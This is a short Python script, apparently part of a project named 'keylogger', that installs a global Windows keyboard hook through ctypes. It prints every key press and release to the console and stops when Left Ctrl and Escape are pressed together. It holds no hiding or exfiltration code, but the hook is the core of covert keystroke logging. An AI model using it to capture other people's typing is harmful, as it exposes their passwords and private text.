from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
from ctypes.wintypes import WPARAM, LPARAM, MSG
from keylogger.keys import *
import sys
user32 = windll.user32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105

msg = MSG()
_msg = byref(msg)

LLKP_decl = CFUNCTYPE(c_int, c_int, WPARAM, POINTER(LPARAM))

keys = set()


def callback(nCode, wParam, lParam):
    code = lParam[0] % 256
    if wParam == WM_KEYUP and code in keys:
        keys.remove(code)
        print("up ", hex(code))
    elif wParam == WM_KEYDOWN:
        keys.add(code)

        print("down ", hex(code), keys)

        if keys == {VK_LCONTROL, VK_ESCAPE}:
            user32.UnhookWindowsHookEx(hook)
            sys.exit(0)

    return user32.CallNextHookEx(hook, nCode, wParam, lParam)

callback = LLKP_decl(callback)

hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
user32.GetMessageA(_msg, 0, 0, 0)